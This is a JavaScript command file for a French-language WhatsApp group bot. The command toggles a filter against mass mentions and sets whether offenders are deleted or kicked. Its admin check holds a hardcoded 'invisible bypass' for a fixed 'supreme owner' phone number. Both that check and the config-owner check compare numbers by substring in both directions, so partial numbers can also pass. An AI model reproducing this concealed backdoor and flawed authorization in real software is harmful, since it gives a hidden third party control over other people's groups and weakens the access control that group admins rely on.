/**
 * Anti-Group Mention Command - Toggle antigroupmention protection with delete/kick options
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const database = require('../../database');
const config = require('../../config.js');

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}
const prefix = config.prefix || '.';
module.exports = {
  name: 'antigroupmention',
  aliases: ['antitagall'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴄᴏɴғɪɢᴜʀᴇ ʟᴀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴄᴏɴᴛʀᴇ ʟᴇs ᴍᴇɴᴛɪᴏɴs ɢʟᴏʙᴀʟᴇs (ᴅᴇʟᴇᴛᴇ/ᴋɪᴄᴋ)**',
  usage: `${prefix}antigroupmention <on/off/set/get>`,
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) { 
    const prefix = config.prefix || '.';
    const { reply } = extra;

    try { 
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      if (!extra.isAdmin && !isMe) {
        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
      }

      if (!args[0]) {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.antigroupmention ? 'ON' : 'OFF';
        const action = (settings.antigroupmentionAction || 'delete').toUpperCase();

        return reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ʙᴏᴜᴄʟɪᴇʀ_ᴍᴇɴᴛɪᴏɴs* •≫━╾╮\n` +
          `┃ 🔮 *ᴇ́ᴛᴀᴛ* : [ ${status} ]\n` +
          `┃ ⚖️ *sᴇɴᴛᴇɴᴄᴇ* : [ ${action} ]\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `*🔮 ɪɴᴄᴀɴᴛᴀᴛɪᴏɴs ᴅɪsᴘᴏɴɪʙʟᴇs :*\n` +
          `*ᴄᴇᴛ ᴀʀᴄᴀɴᴇ ᴅᴇ́ᴛᴇᴄᴛᴇ ᴇᴛ ᴘᴜʀɢᴇ ʟᴇs ᴍᴇɴᴛɪᴏɴs ɢʟᴏʙᴀʟᴇs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ.*\n\n` +
          `  ${prefix}antigroupmention on\n` +
          `  ${prefix}antigroupmention off\n` +
          `  ${prefix}antigroupmention set delete | kick\n` +
          `  ${prefix}antigroupmention get\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
        );
      }

      const opt = args[0].toLowerCase();

      if (opt === 'on') {
        if (database.getGroupSettings(extra.from).antigroupmention) {
          return reply(`*⚠️ ${toSmallCaps('le bouclier mentions est deja actif')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
        }
        database.updateGroupSettings(extra.from, { antigroupmention: true });
        return reply(`*✅ ${toSmallCaps('le bouclier mentions a ete eveille')} (ON).*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
      }

      if (opt === 'off') {
        database.updateGroupSettings(extra.from, { antigroupmention: false });
        return reply(`*❌ ${toSmallCaps('le bouclier mentions a ete desactive')} (OFF).*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
      }

      if (opt === 'set') {
        if (args.length < 2) {
          return reply(`*❓ ${toSmallCaps('veuillez specifier une sentence')} : \`${prefix}antigroupmention set delete | kick\`*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
        }

        const setAction = args[1].toLowerCase();
        if (!['delete', 'kick'].includes(setAction)) {
          return reply(`*❓ ${toSmallCaps('sentence invalide. choisissez entre delete ou kick')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
        }

        database.updateGroupSettings(extra.from, { 
          antigroupmentionAction: setAction,
          antigroupmention: true // Activation automatique lors du choix de la sentence
        });
        return reply(`*⚖️ ${toSmallCaps('la sentence du bouclier mentions est placee sur')} : ${setAction.toUpperCase()}*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
      }

      if (opt === 'get') {
        const settings = database.getGroupSettings(extra.from);
        const status = settings.antigroupmention ? 'ON' : 'OFF';
        const action = (settings.antigroupmentionAction || 'delete').toUpperCase();

        return reply(
          `╭╼━≪• *sᴛᴀᴛᴜᴛ ʙᴏᴜᴄʟɪᴇʀ_ᴍᴇɴᴛɪᴏɴs* •≫━╾╮\n` +
          `┃ 🔮 *ᴇ́ᴛᴀᴛ* : [ ${status} ]\n` +
          `┃ ⚖️ *sᴇɴᴛᴇɴᴄᴇ* : [ ${action} ]\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
        );
      }

      return reply(`*❓ ${toSmallCaps('utilise')} \`${prefix}antigroupmention\` ${toSmallCaps('pour voir les options')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);

    } catch (error) {
      console.error('AntiGroupMention command error:', error);
      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
    }
  }
};
